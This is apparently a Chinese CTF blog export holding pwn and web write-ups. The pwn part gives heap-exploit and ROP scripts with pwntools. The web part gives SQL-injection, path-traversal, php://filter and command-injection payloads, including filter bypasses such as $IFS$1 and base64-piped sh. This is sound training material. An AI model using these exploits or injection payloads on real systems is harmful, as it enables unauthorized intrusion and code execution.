io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index:&quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;Command:&quot;)    io.sendline(b&quot;4&quot;)    io.recvuntil(&quot;Index:&quot;)    io.sendline(str(index))add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,len(payload),payload)delete(1)add(0x68)#3&amp;1show(2)io.recvuntil(&quot;Content:&quot;)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = addr - (0x7fc2d9938b78-0x7fc2d9574000)malloc_hook = libc_addr+libc.sym[&quot;__malloc_hook&quot;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]add(0x68)#4&amp;2delete(2)edit(4,len(p64(malloc_hook)),p64(malloc_hook-0x23))add(0x68)#4 add(0x68)#5 onegadget = 0x4526a+libc_addr  #0x45216  0x4526a  0xf02a4  0xf1147payload = cyclic(0x8+0xb)+p64(onegadget)edit(5,len(payload),payload)add(0x30)io.interactive()\n\n","categories":["wp"]},{"title":"chunk extend and overlapping","url":"/2023/03/01/chunk-extend-and-overlapping/","content":"chunk extend的利用手法是基于plmalloc对于堆块的各种宏定义 其是通过计算chunk首地址和size大小来推断出上一个chunk或者是下一个chunk的地址\n/* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n\n获取下一个chunk的地址既是通过当前chunk地址加上当前chunk大小\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n\n获取上一个chunk的地址则是通过当前chunk的地址减去前一个chunk的大小\n也就是说 只要我们修改了chunk的size域和prev_size域 就可以使plmalloc误判chunk\n堆溢出覆盖下一个chunk的size域这个手法主要有两种适用的题型 一种是有伴随堆块的情况下 并且没有堆溢出 通过这种手法可以修改伴随堆块的内容\n第二种是libc2.27的情况下 tcachebin的存在会使得我们打unsortedbin造成很大的影响 要么就是填满链表要么就是申请一个超过tcachebin大小的chunk并释放 有的题目会对这两种解决办法进行限制 这个时候就可以利用这种办法来合并chunk 从而获得一个超过tcachebin范围的堆块\n下面来分别演示一下\n环境:ubuntu22 (二进制文件依赖的libc2.27) 目测2.23以上的版本都可以add(0x20,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)debug()\n\n首先申请三个堆块 chunk1用来堆溢出 覆盖chunk2的size域 chunk3用来和chunk2合并\n唯一要注意的是覆盖size域的值 需要包括两个堆块的prev_size域和size域\n\n所以此时用来覆盖chunk2的size域的数值应为0x51\nadd(0x20,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x28)+b&#x27;\\x51&#x27;edit(0,len(payload),payload)debug()\n\n此时chunk2就和chunk3合并了\n\n此时chunk2的指针指向的仍然是chunk2的首地址 但是plmalloc已经误判了chunk2  原本其是一个0x31大小的chunk 此时plmalloc误判其还包含了chunk3 所以释放chunk2就会一并释放chunk3\n\n可以看到一并放入了tcache 这里之所以没有和top chunk合并 是因为tcache中的chunk  Inuse位仍然为1\n此时我们申请一个0x40大小的chunk 就可以获得原本chunk3的空间 从而对chunk3的内容进行任意修改\n此外还有一种情况 如果chunk2先被释放进入tcachebin后再更改size域会发生什么呢\nadd(0x20,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x28)+p64(0x441)delete(1)edit(0,len(payload),payload)debug()\n\n此时注意 chunk2不能位于fastbin或者是tcachebin中  如果位于二者中 下一个chunk的Inuse位就不会为0 这样就不会合并\ngdb动调看一下是否合并成功\n\n环境: ubuntu16 二进制依赖libc2.23这类的利用手法被称为overpadding\n你可以理解为反方向的合并 刚才是由chunk2吞并chunk3 修改的是chunk2的size域 现在我们来修改chunk3的prev_size域和size域 从而使得chunk2合并chunk3\n这里的知识点其实和unlink有点相似 unlink也是通过构造fake chunk 伪造好next chunk的prev_size和size\nadd(0x80,b&#x27;aaaa&#x27;) #0add(0x10,b&#x27;aaaa&#x27;) #1add(0x80,b&#x27;aaaa&#x27;) #2add(0x10,b&#x27;aaaa&#x27;) #3\n\n首先申请四个chunk 前三个用来负责合并  第四个用来保证不和top chunk合并\n我们以chunk1来为堆溢出的起点 覆盖chunk2的prev_size和size域 不过在此之前还需要先释放chunk0到unsortedbin中(只要不是fastbin和tcachebin就可以) 这样才能使得后面的合并生效\nadd(0x80,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x80,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)payload = cyclic(0x10)+p64(0xb0)+p64(0x90)edit(1,len(payload),payload)\n\n注意一下chunk2的size域  Inuse位一定要为0 否则不会合并\n此时我们释放chunk2 来看看是否合并成功\n\n这种一般是伴随堆块先申请的情况可以利用  从而获取到低地址处堆块任意写的机会\n","categories":["堆"]},{"title":"buu刷题记录","url":"/2022/11/11/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"不打算像pwn一样详细 记录一下自己在buu刷题过程学习的知识点\n[极客大挑战 2019]EasySQL\n靶机开启后 要求我们输入用户名和密码\n这里随便输入后 会发现账号密码都显示在url里  所以可以判断是get传参\n\n这里使用万能密码\npayload = username=&#x27;or&#x27;1&#x27;=&#x27;1&amp;password=admin&#x27;or&#x27;1&#x27;=&#x27;1\n\n先从单引号开始解释 这是由于sql注入的闭合方式\n常用闭合方式：单引号&#39;&#39;、双引号&quot;&quot;、括号()、括号+单引号(&#39;&#39;)、多层括号+单引号，例((((((((&#39;&#39;))))))))。另外mysql还可以使用括号+双引号(&quot;&quot;)和多层括号+双引号((((((((&quot;&quot;))))))))\n我们单独输入1’ 判断一下闭合方式\n\n可以发现是单引号闭合\n这里解释一下 为什么单引号需要构造成上述payload那样\nselect * from table_name where username=&#x27;  &#x27; and password=&#x27;&#x27; ;\n\n‘or ‘1’&#x3D;’1  中 第一个引号是用来闭合username&#x3D;’的引号\n最后一个引号是用来闭合’and的引号\n第二种办法 直接在输入框中手动输入 ‘or 1&#x3D;1 # \n这样相当于\nselect * from table_name where username=&#x27;1&#x27; or 1=1 # &#x27; and password=&#x27;xxxxxx&#x27; ;\n\n同样可以绕过\n[HCTF 2018]WarmUp进入靶机 只有一张滑稽图片\nf12查看源代码发现了source.php字样\n &lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                 //判断$page是否为空 或者是否为字符串                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;                             //判断$page是不是白名单里面            &#125;            $_page = mb_substr(                $page,                0,                                      //mb_strpos表示$page中?是在第几个位置 并返回                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)             //即返回$page？前的字符串 检测是否在白名单内            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);                    //对page url解码后再判断一次            $_page = mb_substr(                $_page,                0,                 mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt; \n\n还有一个hint.php没看\nflag not here, and flag in ffffllllaaaagggg\n\n推测ffffllllaaaagggg是存储flag的文件\n这里使用多个..&#x2F;进行目录穿越来读取flag的值\n/?file=source.php?../../../../../../../../../ffffllllaaaagggg\n\n..&#x2F;可以多用几个 只要超过了ffffllllaaaagggg对应的子目录\n[极客大挑战 2019]Havefunf12查看页面源代码\n&lt;!--       $cat=$_GET[&#x27;cat&#x27;];       echo $cat;       if($cat==&#x27;dog&#x27;)&#123;           echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;       &#125;--&gt;\n\n当cat &#x3D; dog的时候输出flag\npayload = cat=dog\n\n这题比较简单\n[ACTF2020 新生赛]Include题目直接明说了flag文件的地址\n?file=flag.php\n\n但是我们并没有看到flag\n推测flag应该是在源代码中\n这里可以利用php:&#x2F;&#x2F;filter伪协议来查看源代码\n?file=php://filter/convert.base64-encode/resource=flag.php #这题payload\n\n?xxx=php://filter/convert.base64-encode/resource=xxx.php  #协议格式\n\n得到了base64编码的flag\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NThjOWJmYWEtOThjOC00YTAyLWE3OTUtOTQyNzk1NTg2NDZjfQo=\n\n解码后得到flag\n&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;58c9bfaa-98c8-4a02-a795-94279558646c&#125;\n\nphp:&#x2F;&#x2F;filter伪协议作用：php:&#x2F;&#x2F;filter可以获取指定文件源码。当其与文件包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行，从而读取任意文件源代码。\n详细解释：https://blog.csdn.net/woshilnp/article/details/117266628\n[ACTF2020 新生赛]Exec靶机打开后显示\n\nping一下本地ip试试\n\n有回显 再输一次 127.0.0.1;ls\nPING 127.0.0.1 (127.0.0.1): 56 data bytesindex.php\n\nflag应该在别的目录\n127.0.0.1;pwd\nPING 127.0.0.1 (127.0.0.1): 56 data bytes/var/www/html\n\ncd &#x2F;查看一下根目录下所有文件 （其实直接find -name flag就好了，但是对方的docker可能没有拷find进去）\nPING 127.0.0.1 (127.0.0.1): 56 data bytesbindevetcflaghomelibmediamntoptprocrootrunsbinsrvsystmpusrvar\n\n看到flag了 但是这里要注意下我们直接cat flag的话 目录并不是根目录\n所以这里 cat &#x2F;flag\n[GXYCTF2019]Ping Ping Ping这题属于是上一题的升级了\n/?ip= \n\n页面显示只有这个\n有了上一题的经验 这里直接ip&#x3D;127.0.0.1;ls看一下\nPING 127.0.0.1 (127.0.0.1): 56 data bytesflag.phpindex.php\n\n有一个flag.php\ncat一下试试\n/?ip= fxck your space!\n\n空格被屏蔽了 猜测是空格绕过 用到$IFS$1\nip&#x3D;127.0.0.1;cat$IFS$1flag.php试一下\n/?ip= fxck your flag!\n\n又被屏蔽了？看一下index.php 究竟屏蔽了哪些关键词\n/?ip=|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123;    echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;    die(&quot;fxck your space!&quot;);  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;    die(&quot;fxck your bash!&quot;);  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;    die(&quot;fxck your flag!&quot;);  &#125;  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&quot;;  print_r($a);&#125;?&gt;\n\nflag被屏蔽了 空格也被屏蔽了 base和其他的一些小字符也被屏蔽了\n不妨试试编码绕过关键词\n我们想要让系统执行的是\ncat$IFS$1flag.php\n\nY2F0JElGUyQxZmxhZy5waHA= //base64后\n\necho$IFS$1Y2F0JElGUyQxZmxhZy5waHA=|base64$IFS$1-d|sh  \n\n但是我们仍然没有看到flag 查看一下页面源代码 发现flag被注释了\n/?ip=&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes&lt;?php$flag = &quot;flag&#123;df216e35-445a-444f-ab34-dbfd7735c860&#125;&quot;;?&gt;\n\n尝试一下第二种办法 因为我们发现index.php中有一个变量$a 我们给他赋值g\na=g;cat$IFS$1fla$a.php\n\n/?ip=&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes&lt;?php$flag = &quot;flag&#123;df216e35-445a-444f-ab34-dbfd7735c860&#125;&quot;;?&gt;\n\n同样可以显示出来\n$IFS$IFS默认是空字符(空格Space、Tab、换行\\n)，把相邻的连续的分割符合并到了一起\n看一下下面两个例子\nstring1=&quot;1 2 3 4&quot;echo $string1echo &quot;$string1&quot;\n\n1 2 3 41 2 3 4\n\n这种情况下 二者输出是一样的\n如果我们多增加一个空格呢\nIFS就会将其合并后输出\nstring2=&quot;1  2  3  4&quot;echo $string2echo &quot;$string2&quot;\n\n1 2 3 41  2  3  4\n\n如果判断是IFS的效果\n我们对IFS定义一下再看效果\nIFS=&#x27;-&#x27;string2=&quot;1  2  3  4&quot;echo $string2echo &quot;$string2&quot;\n\n1  2  3  41  2  3  4\n\n“ “相当于就是屏蔽了IFS\n[极客大挑战 2019]Secret File打开后查看网页源码\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;style type=&quot;text/css&quot; &gt;#master &#123;    position:absolute;    left:44%;    bottom:0;    text-align :center;        &#125;        p,h1 &#123;                cursor: default;        &#125;&lt;/style&gt;        &lt;head&gt;                &lt;meta charset=&quot;utf-8&quot;&gt;                &lt;title&gt;蒋璐源的秘密&lt;/title&gt;        &lt;/head&gt;        &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;            &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;你想知道蒋璐源的秘密么？&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;            &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;想要的话可以给你，去找吧！把一切都放在那里了！&lt;/p&gt;            &lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt;            &lt;div style=&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;        &lt;/body&gt;&lt;/html&gt;\n\n发现了一个地址 跟进一下.&#x2F;Archive_room.php\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;style type=&quot;text/css&quot; &gt;#master\t&#123;    position:absolute;    left:44%;    bottom:20;    text-align :center;    \t&#125;        p,h1 &#123;                cursor: default;        &#125;&lt;/style&gt;\t&lt;head&gt;\t\t&lt;meta charset=&quot;utf-8&quot;&gt;\t\t&lt;title&gt;绝密档案&lt;/title&gt;\t&lt;/head&gt;\t&lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\t\t\t\t&lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;\t\t我把他们都放在这里了，去看看吧\t\t&lt;br&gt;\t\t&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\t\t&lt;a id=&quot;master&quot; href=&quot;./action.php&quot; style=&quot;background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;&quot;&gt;\t\t\t&lt;font size=6&gt;SECRET&lt;/font&gt;\t\t&lt;/a&gt;\t&lt;div style=&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;\t&lt;/body&gt;&lt;/html&gt;\n\n再次跟进.&#x2F;action.php\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;style&gt;        p,h1 &#123;                cursor: default;        &#125;&lt;/style&gt;\t&lt;head&gt;\t\t&lt;meta charset=&quot;utf-8&quot;&gt;\t\t&lt;title&gt;END&lt;/title&gt;\t&lt;/head&gt;\t&lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\t\t\t\t&lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;查阅结束&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\t\t\t\t&lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;没看清么？回去再仔细看看吧。&lt;/p&gt;\t\t&lt;div style=&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;\t&lt;/body&gt;&lt;/html&gt;\n\n提示说跳转的太快没有看清？ 猜测应该是要用到burp抓包\n我们返回刚才.&#x2F;Archive_room.php的页面准备抓包\nHTTP/1.1 302 FoundServer: openrestyDate: Mon, 14 Nov 2022 02:55:48 GMTContent-Type: text/html; charset=UTF-8Connection: closeLocation: end.phpX-Powered-By: PHP/7.3.11Content-Length: 63&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;!--   secr3t.php        --&gt;&lt;/html&gt;\n\n发现了一个secr3t.php 跟进看一下\n&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#x27;file&#x27;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;\n\n目录穿越等办法都禁用了 那么这里用之前学到的php:&#x2F;&#x2F;filter伪协议\n?file=php://filter/convert.base64-encode/resource=flag.php\n\n成功得到了一串base64编码\n解密后得到flag\n&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;FLAG&lt;/title&gt;    &lt;/head&gt;    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;                &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;                &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;            &lt;?php                echo &quot;我就在这里&quot;;                $flag = &#x27;flag&#123;6f8af5fd-18ec-4da1-ac03-5975e4d1d176&#125;&#x27;;                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;            ?&gt;        &lt;/p&gt;    &lt;/body&gt;&lt;/html&gt;\n\n[ACTF2020 新生赛]BackupFile我们通过查看首页源代码得不到任何想要的信息，此时我们应该想到使用目录扫描来得到我们想要的文件名信息\n这里利用dirsearch目录扫描工具\npython dirsearch.py -u http://a90d7c0c-e2a7-4a93-9087-0844df13bce9.node4.buuoj.cn:81\n\n\n下载文件后打开\n&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123;    $key = $_GET[&#x27;key&#x27;];    if(!is_numeric($key)) &#123;        exit(&quot;Just num!&quot;);    &#125;    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) &#123;        echo $flag;    &#125;&#125;else &#123;    echo &quot;Try to find out source file!&quot;;&#125;\n\n这里涉及到的知识点是弱类型比较\n在==转换字符串的过程中，遵循如下原则：    当字符串开始部分不存在数值的时候，会将该字符串转换为数值 0。如var_dump(&#x27;abc&#x27; == 0)，结果为 True    当字符串开始部分有合法数值的时候，会将该字符串转换为合法数值。如var_dump(&#x27;123abc&#x27; == 123)，结果为True    当字符串中包含 e 或者 E 时，会将其识别为科学计数法。如var_dump(&#x27;0e12asda&#x27; == 0)，结果为True\n\npayload = key=123\n\n得到flag\n","categories":["web"]},{"title":"ciscn_2019_s_3","url":"/2022/11/14/ciscn-2019-s-3/","content":"Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)\n\n主体函数非常简单 利用系统调用号实现了一次输入和输出\nsigned __int64 vuln()&#123;  signed __int64 v0; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_read(0, buf, 0x400uLL);  return sys_write(1u, buf, 0x30uLL);&#125;\n\n还有一个gadget函数 看一下汇编代码\n.text:00000000004004D6 ; =============== S U B R O U T I N E =======================================.text:00000000004004D6.text:00000000004004D6 ; Attributes: bp-based frame.text:00000000004004D6.text:00000000004004D6                 public gadgets.text:00000000004004D6 gadgets         proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6                 push    rbp.text:00000000004004D7                 mov     rbp, rsp.text:00000000004004DA                 mov     rax, 0Fh.text:00000000004004E1                 retn.text:00000000004004E1 gadgets         endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2                 mov     rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9                 retn.text:00000000004004E9 ; ---------------------------------------------------------------------------\n\n下方的0x3b则为59 是execve的系统调用号\n应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址\n所以只能通过写入栈上\n要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10\n还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流\n.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED                 push    rbp.text:00000000004004EE                 mov     rbp, rsp.text:00000000004004F1                 xor     rax, rax.text:00000000004004F4                 mov     edx, 400h       ; count.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf.text:00000000004004FE                 mov     rdi, rax        ; fd.text:0000000000400501                 syscall                 ; LINUX - sys_read.text:0000000000400503                 mov     rax, 1.text:000000000040050A                 mov     edx, 30h ; &#x27;0&#x27;  ; count.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf.text:0000000000400514                 mov     rdi, rax        ; fd.text:0000000000400517                 syscall                 ; LINUX - sys_write.text:0000000000400519                 retn.text:0000000000400519 vuln            endp ; sp-analysis failed.text:0000000000400519.text:0000000000400519 ; ---------------------------------------------------------------------------\n\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))gdb.attach(io)print(hex(stack_addr))\n\n\n可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移\n这里的原因暂时没有办法得知 先放着这个疑问\n下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu\n具体的流程我就不过多赘述了\nrdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)binsh_addr = stack_addr - 0x138payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)\n\n这里重点解释一下三个方面\n1.为什么要多出一个p64(int59_addr)在栈上\n这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的\n2.binsh_addr和stack_addr的偏移是怎么求出来的\n我们将断点打在csu执行到call r12那一行\n然后gdb看一下栈\n\n可以计算出偏移为0x138\n还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向\n如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容\nset $rsp = $rsp-0x150\n\n\n看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧\n最终exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))binsh_addr = stack_addr - 0x138rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)io.interactive()\n\n","categories":["wp"]},{"title":"ciscn历年国赛复现","url":"/2023/02/22/ciscn%E5%8E%86%E5%B9%B4%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"备战一下今年的国赛 准备复现以往的题目来熟悉一下难度\n[CISCN 2022 初赛]login_normal[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&#x27;\n\n保护全开 一开始还以为是道堆题 ida进去看看\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char s[1032]; // [rsp+0h] [rbp-410h] BYREF  unsigned __int64 v4; // [rsp+408h] [rbp-8h]  v4 = __readfsqword(0x28u);  buffer();  while ( 1 )  &#123;    memset(s, 0, 0x400uLL);    printf(&quot;&gt;&gt;&gt; &quot;);    read(0, s, 0x3FFuLL);    sub_FFD(s);  &#125;&#125;\n\nmain函数接收了s 并且作为sub_ffd的参数 跟进一下\nunsigned __int64 __fastcall sub_FFD(_BYTE *a1)&#123;  char *sa; // [rsp+8h] [rbp-48h]  char *sb; // [rsp+8h] [rbp-48h]  char *sc; // [rsp+8h] [rbp-48h]  char *sd; // [rsp+8h] [rbp-48h]  char v7; // [rsp+17h] [rbp-39h]  int v8; // [rsp+1Ch] [rbp-34h]  int v9; // [rsp+2Ch] [rbp-24h]  void *dest; // [rsp+30h] [rbp-20h]  char *s1; // [rsp+38h] [rbp-18h]  char *nptr; // [rsp+40h] [rbp-10h]  unsigned __int64 v13; // [rsp+48h] [rbp-8h]  v13 = __readfsqword(0x28u);  memset(bss_array, 0, sizeof(bss_array));  v8 = 0;  v7 = 0;  dest = 0LL;  while ( !*a1 || *a1 != &#x27;\\n&#x27; &amp;&amp; (*a1 != &#x27;\\r&#x27; || a1[1] != 10) )  &#123;    if ( v8 &lt;= 5 )      bss_array[2 * v8] = a1;    sb = strchr(a1, &#x27;:&#x27;);    if ( !sb )    &#123;      puts(&quot;error.&quot;);      exit(1);    &#125;    *sb = 0;    for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc )      *sc = 0;    if ( !*sc )    &#123;      puts(&quot;abort.&quot;);      exit(2);    &#125;    if ( v8 &lt;= 5 )      bss_array[2 * v8 + 1] = sc;    sd = strchr(sc, &#x27;\\n&#x27;);    if ( !sd )    &#123;      puts(&quot;error.&quot;);      exit(3);    &#125;    *sd = 0;    a1 = sd + 1;    if ( *a1 == &#x27;\\r&#x27; )      *a1++ = 0;    s1 = bss_array[2 * v8];    nptr = bss_array[2 * v8 + 1];    if ( !strcasecmp(s1, &quot;opt&quot;) )    &#123;      if ( v7 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      v7 = atoi(nptr);    &#125;    else    &#123;      if ( strcasecmp(s1, &quot;msg&quot;) )      &#123;        puts(&quot;error.&quot;);        exit(4);      &#125;      if ( strlen(nptr) &lt;= 1 )      &#123;        puts(&quot;error.&quot;);        exit(5);      